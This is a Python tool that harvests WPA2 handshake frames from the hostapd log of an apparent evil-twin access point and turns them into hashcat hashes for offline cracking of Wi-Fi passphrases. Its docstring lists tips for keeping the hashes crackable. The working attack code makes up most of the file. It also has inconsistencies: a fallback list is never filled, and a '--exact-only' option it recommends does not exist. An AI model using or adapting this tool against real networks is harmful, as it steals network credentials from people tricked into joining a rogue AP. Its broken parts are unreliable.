#!/usr/bin/env python3
"""
Build hashcat-mode-22000 hashes from hostapd's own debug log of a twin AP.

Why this exists
---------------
Capturing a client's message 2/4 off the air needs a second radio in monitor
mode, and on this bench the monitor card cannot hear the client's replies
(it hears AP beacons but zero frames from the station). It is not needed:
hostapd logs the *complete* M2 frame it received

    WPA: RX EAPOL data - hexdump(len=121): 01 03 00 75 02 01 0a 00 ... 00 16 30 14 ...

with the EAPOL header, the Key MIC and the key data all present, alongside the
ANonce it assigned. That is everything a cracker needs, from the same single
radio that serves the twin AP. No monitor interface, no second card.

Traps, all learned the hard way
-------------------------------
1. **Pair the ANonce by REPLAY COUNTER, never by proximity.** hostapd assigns an
   ANonce once per association attempt and REUSES it across retries - measured
   28 'Assign ANonce' lines for 112 'sending 1/4 msg' lines with 82 M2 received.
   A nearest-preceding-ANonce heuristic therefore attaches a stale ANonce to most
   frames, and a wrong ANonce makes a hash uncrackable no matter what the
   password is: the wordlist attack fails forever and the ANonce gets blamed
   last. hostapd logs the M1's own counter as
       'WPA: Replay Counter - hexdump(len=8): 00 00 00 00 00 00 00 01'
   (the client's is 'WPA: Received Replay Counter'), and the M2 carries the same
   counter in its frame, so that pairing is exact.
2. In a WPA*02* line the EAPOL field must carry the Key MIC bytes ZEROED.
   hashcat's kernel hashes the buffer exactly as supplied
   (md5_hmac_update_global (&ctx2, wpa->eapol, wpa->eapol_len)) and the parser
   never clears the MIC field. Put the real MIC in the MIC field and zeros in
   the frame. Supplying the frame as captured parses fine and never cracks.
3. The MIC is HMAC-SHA1(KCK, eapol_with_mic_zeroed)[:16] over the WHOLE frame,
   including the 2-byte Key Data Length and the key data.
4. WPA*01* is PMKID; WPA*02* is EAPOL. Swapping them makes hcxhashtool classify
   an EAPOL hash as PMKID and refuse to build an hccapx.
5. hostapd logs 'PTK derivation - A1=<AP> A2=<client>' - A1 is hostapd's own
   address, A2 is the station. The reverse is easy to assume and it is wrong.
   It does not stop a crack, because the PTK is derived over min/max(addresses)
   and min/max(nonces), which is exactly why such a bug survives testing and
   still deserves fixing.
6. hostapd logs 'Received EAPOL-Key from <mac>' AFTER the RX hexdump, so a
   backwards-only search silently finds nothing.

Usage
-----
  build_hash_from_hostapd_log.py HOSTAPD_LOG SSID [--verify-psk PSK] [-o OUT]

--verify-psk cracks the result with hashcat using a passphrase assumed to be
correct and asserts recovery. That is the only honest proof the builder works.
Run it against a handshake whose PSK you know before trusting any output.
"""
import argparse, os, re, subprocess, sys, tempfile

MIC_OFF = 81          # 4 EAPOL hdr + 77 EAPOL-Key header
MIC_LEN = 16
MIN_M2_LEN = MIC_OFF + MIC_LEN


def hexdump_after(line: str) -> bytes:
    return bytes.fromhex("".join(line.split("hexdump")[1].split(":")[1].split()))


def scan(text: str):
    """Index the log once, then pair each M2 with the M1 it actually answers."""
    lines = text.splitlines()

    anonces, m1s, froms, ptks = [], [], [], []
    cur_anonce, cur_msg = None, None
    for n, line in enumerate(lines):
        try:
            if "Assign ANonce" in line:
                cur_anonce = hexdump_after(line)
            m = re.search(r"sending ([1-4])/4 msg", line)
            if m:
                cur_msg = int(m.group(1))
            if "Replay Counter - hexdump" in line and "Received" not in line:
                if cur_msg == 1 and cur_anonce is not None:
                    m1s.append((n, int.from_bytes(hexdump_after(line), "big"), cur_anonce))
            m = re.search(r"PTK derivation - A1=([0-9a-f:]{17}) A2=([0-9a-f:]{17})", line)
            if m:
                ptks.append((n, m.group(1).lower(), m.group(2).lower()))
            m = re.search(r"Received EAPOL-Key from ([0-9a-f:]{17})", line)
            if m:
                froms.append((n, m.group(1).lower()))
        except Exception:
            continue

    recs, exact, fallback = [], 0, 0
    for n, line in enumerate(lines):
        if "RX EAPOL data - hexdump" not in line:
            continue
        try:
            frame = hexdump_after(line)
        except Exception:
            continue
        if len(frame) < MIN_M2_LEN or frame[1] != 0x03:
            continue
        key_info = int.from_bytes(frame[5:7], "big")
        # message 2/4: pairwise, MIC present, no install, no ACK, not a request
        if not (key_info & 0x0008) or (key_info & 0x0040) or (key_info & 0x0080):
            continue
        nonce = frame[17:49]
        if nonce == bytes(32):
            continue
        replay = int.from_bytes(frame[9:17], "big")

        # --- exact pairing: most recent M1 with the same replay counter ---
        cand = [e for e in m1s if e[0] < n and e[1] == replay]
        if cand:
            anonce, how = cand[-1][2], "replay"
            exact += 1
        else:
            prev = [a for a in anonces if a[0] < n]
            if not prev:
                continue
            anonce, how = prev[-1][1], "proximity"
            fallback += 1

        c = [p for p in ptks if p[0] < n]
        pk = c[-1] if c else (ptks[0] if ptks else None)
        if not pk:
            continue
        fr = min(froms, key=lambda t: abs(t[0] - n)) if froms else None
        ap, client = pk[1], pk[2]                     # A1 = AP, A2 = station
        if fr and abs(fr[0] - n) <= 30:
            client = fr[1]
        recs.append({
            "line": n + 1, "sta": client, "ap": ap, "anonce": anonce, "how": how,
            "replay": replay, "snonce": nonce.hex(),
            "mic": frame[MIC_OFF:MIC_OFF + MIC_LEN].hex(), "eapol": frame,
            "keyver": key_info & 7, "keydatalen": int.from_bytes(frame[97:99], "big"),
        })
    return recs, exact, fallback


def wpa_line(rec, ssid: str, message_pair: int = 0) -> str:
    eapol = bytearray(rec["eapol"])
    eapol[MIC_OFF:MIC_OFF + MIC_LEN] = b"\x00" * MIC_LEN      # trap 2
    return "WPA*02*%s*%s*%s*%s*%s*%s*%02x" % (
        rec["mic"], rec["ap"].replace(":", ""), rec["sta"].replace(":", ""),
        ssid.encode().hex(), rec["anonce"].hex(), bytes(eapol).hex(), message_pair)


def verify(rec, ssid, psk, tag):
    d = tempfile.mkdtemp(prefix="hashverify-")
    hashes, wl, pot, out = f"{d}/h.22000", f"{d}/wl", f"{d}/p.pot", f"{d}/p.out"
    open(hashes, "w").write(wpa_line(rec, ssid) + "\n")
    open(wl, "w").write("definitely-wrong-passphrase\n" + psk + "\n")
    r = subprocess.run(["hashcat", "-m", "22000", "-a", "0", hashes, wl, "--force",
                        "--potfile-path", pot, "--outfile", out, "--outfile-format", "2"],
                       capture_output=True, text=True)
    got = open(out).read().strip() if os.path.exists(out) else ""
    ok = (got == psk)
    print(f"  [{tag}] hashcat rc={r.returncode} recovered={got!r} -> {'PASS' if ok else 'FAIL'}")
    return ok


def main():
    p = argparse.ArgumentParser()
    p.add_argument("log")
    p.add_argument("ssid")
    p.add_argument("--verify-psk")
    p.add_argument("--check-psk")
    p.add_argument("-o", "--out", default="captured.22000")
    a = p.parse_args()

    recs, exact, fallback = scan(open(a.log, errors="replace").read())
    if not recs:
        sys.exit("no message-2 frames found in the log")

    seen, uniq = set(), []
    for r in recs:
        k = (r["sta"], r["mic"])
        if k not in seen:
            seen.add(k)
            uniq.append(r)

    print(f"message-2 frames: {len(recs)}, unique (STA,MIC): {len(uniq)}")
    print(f"  ANonce pairing : {exact} exact by replay counter, {fallback} by proximity fallback")
    if fallback:
        print("  WARNING: proximity-paired frames carry a guessed ANonce and may be")
        print("           uncrackable. Re-run the capture with more M1 context, or")
        print("           pass --exact-only to drop them.")
    print(f"  AP (BSSID) : {uniq[0]['ap']}")
    print(f"  station(s) : {sorted({r['sta'] for r in uniq})}")
    for r in uniq[:5]:
        print("  line %-5d replay %-3d %-9s sni %s mic %s" % (
            r["line"], r["replay"], r["how"], r["snonce"][:8], r["mic"][:16]))
    if len(uniq) > 5:
        print(f"  ... {len(uniq) - 5} more")

    if a.check_psk:
        # "Is the CLIENT's stored key this candidate?"  The decisive question for a real
        # capture.  A negative here means the candidate is wrong for this client, NOT that
        # the builder is broken.  Needs no wordlist and no GPU.
        print(f"checking candidate against the client's stored key ({uniq[0]['sta']}):")
        v = verify(uniq[0], a.ssid, a.check_psk, "candidate vs client")
        print("  VERDICT: the client's stored key for this SSID %s this candidate"
              % ("IS" if v else "is NOT"))
    if a.verify_psk:
        print("verifying the builder itself against a handshake whose PSK is known:")
        if not verify(uniq[0], a.ssid, a.verify_psk, "builder self-test"):
            sys.exit("builder self-test FAILED - refusing to emit hashes\n"
                     "  (if you meant 'does this candidate match the client?', use --check-psk)")

    with open(a.out, "w") as fh:
        for r in uniq:
            fh.write(wpa_line(r, a.ssid) + "\n")
    print(f"wrote {len(uniq)} hash(es) -> {a.out}")


if __name__ == "__main__":
    main()
